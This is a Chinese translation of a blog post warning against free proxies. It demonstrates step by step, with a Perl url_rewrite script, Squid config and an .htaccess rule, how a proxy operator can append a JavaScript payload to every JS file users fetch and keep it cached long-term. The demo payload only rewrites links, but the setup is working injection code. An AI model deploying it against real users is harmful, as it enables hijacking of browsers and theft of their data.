---
title: 'Why are free proxies free?[译]'
layout: post
guid: urn:uuid:b87da13a-a4dd-402f-b06a-cef720150705
tags:
    - web
    - security
---


本文由 [伯乐在线](http://blog.jobbole.com) - [光光头去打酱油](http://www.jobbole.com/members/zhongjianno1) 翻译，[黄利民](http://www.jobbole.com/members/huanglimin) 校稿。未经许可，禁止转载！
英文出处：[Christian Haschek](https://blog.haschek.at/post/fd9bc)。欢迎加入[翻译组](http://group.jobbole.com/category/feedback/trans-team/)。

【伯乐在线注】：原文副标题是“因为这是一种轻松搞到成千上万用户数据的途径”，作者后来还写了一篇文章《[分析了443个免费代理，其中只有21％没有黑幕，那么剩下的79%呢？](http://blog.jobbole.com/87822/)》。

最近偶然发现， Chema Alonso 在 Defcon 20 会议上谈到他如何从头开始创建一个JavaScript 僵尸网络，然后如何使用它来找到骗子和黑客。

一切都是通过一个 SQUID 代理并修改了些小配置完成的。

这个想法非常简单：

1.【服务器】在一台 linux 服务器上安装 Squid

2.【Payload】修改服务器配置，给所有传输的 javascript 文件插入一些代码，这些代码的作用就是将用户数据传送到你的服务器上，比如用户在表单中输入的所有数据。

3.【缓存】将修改过的 js 文件的缓存时间尽可能延长。

## 可能发生的最坏事情是什么？

当某人能强迫你加载一个受感染的 JS 文件， 那他们可以：

*   窃取你访问的网站的登录信息（从登录表单中或 cookies）
*   窃取你的银行账号或信用卡信息
*   强迫你参与 DDOS 攻击，让你的浏览器一秒钟内加载一个网站几百次，通过 iframe 或 script（脚本）来发送请求。
*   基本你上网做的任何事情都能看到（包括你阅读时鼠标的位置）

## https

如果你的网站加载了一些不安全的资源（比如从一个 http 站点加载 jquery），那该手法在 https 链接上也能生效。大多数浏览器都会提醒你，有些甚至会阻止你访问不安全的内容，但是没有人注意到浏览器地址栏中“锁”的符号。

#### 举个例子

安全：[![a1279bf58d](http://jbcdn2.b0.upaiyun.com/2015/06/4052c3bb6c17583a7cfddf7f07331480.png)](http://jbcdn2.b0.upaiyun.com/2015/06/4052c3bb6c17583a7cfddf7f07331480.png)

不安全：[![9f0d9fc0ce](http://jbcdn2.b0.upaiyun.com/2015/06/40d5191bfedec42199ee845c3a1aae59.png)](http://jbcdn2.b0.upaiyun.com/2015/06/40d5191bfedec42199ee845c3a1aae59.png)

在介绍中，Chema 说他将修改过的服务器 IP 地址发布到网络上，几天后就有 5000 多人使用这个代理。大多数使用代理的人都是为了做坏事，因为他们都知道使用了代理在网络上就变成匿名了，似乎许多人都没有考虑过这个问题：代理同样也可以对他们做一些坏事。

我在想是不是真的那么简单，所以我建了一个运行 Debian(Linux的一个发行版) 的虚拟机，然后努力实现这些概念。

## 编写自己的 js 来感染代理

假设你有一个运行 squid 的代理，同时你还需要一个网站服务器，如使用 /var/www 为根目录(默认设置)的 Apache 服务器。

## 步骤1：创建一个 payload

我打算用一个简单的脚本获取网页上所有的链接，然后将 href(链接) 属性改写成我的站点。

/etc/squid/payload.js

    for(var i=0;i&lt;document.getElementsByTagName('a').length;i++)  
       document.getElementsByTagName('a')[i].href = "https://blog.haschek.at";

## 步骤2：将脚本注入所有请求的 js 文件中。

/etc/squid/poison.pl

```
#!/usr/bin/perl

$|=1;
$count = 0;
$pid = $;

while(&lt;&gt;)
{
  chomp $_;
  if($_ =- /(.*.js)/i)
  {
        $url = $1;
        system("/usr/bin/wget","-q","-O","/var/www/tmp/$pid-$count.js","$url");
        system("chmod o+r /var/www/tmp/$pid-$count.js");
        system("cat /etc/squid/payload.js &gt;&gt; /var/www/tmp/$pid-$count.js");
        print "http://127.0.0.1:80/tmp/$pid-$count.jsn";
  }
  else
  {
        print "$_n";
  }
$count++;
}
```

这个脚本会用 wget 检索到客户端请求的原来的 javascript 文件，然后将 /etc/squid/payload.js 文件中的代码增加进去。这个修改的文件（包含我们的有效负载）将被发送给客户端。你也可以创建文件夹 /var/www/tmp ，然后允许 squid 在该文件夹中写入。这个文件夹可以存放所有被修改过的 js 脚本。

## <步骤3：告诉 Squid 使用上文中的脚本

在 /etc/squid/squid.conf 中添加

<pre class="brush: text; gutter: true">url_rewrite_program /etc/squid/poison.pl</pre>

## 步骤4：让缓存永不过期

/var/www/tmp/.htaccess

    ExpiresActive On
    ExpiresDefault "access plus 3000 days"

这几行告诉 apache 服务器，设置一个疯狂的过期（缓存）时间，所以它会一直存在用户的浏览器中，直到他们清除缓存或 cookies。

重启下 squid 就能运行了。如果你连接到代理上，然后浏览网页，网页会显示预期的内容，但是所有的链接会被指向这个博客。这项技术更猥琐的是，当你断开了与代理的连接，从代理缓存的 js 文件仍存在浏览的缓存中。

在我的例子中 payload 不太具有破坏性，用户很快就能理解什么是“钓鱼”，但是富有创造性的 payload 或像 Beef 类似的框架就能被用来实现各种各样的东西。告诉你的朋友们，绝不要使用免费的代理，因为许多代理就做这些坏事情。

安全上网（但不要使用免费的代理）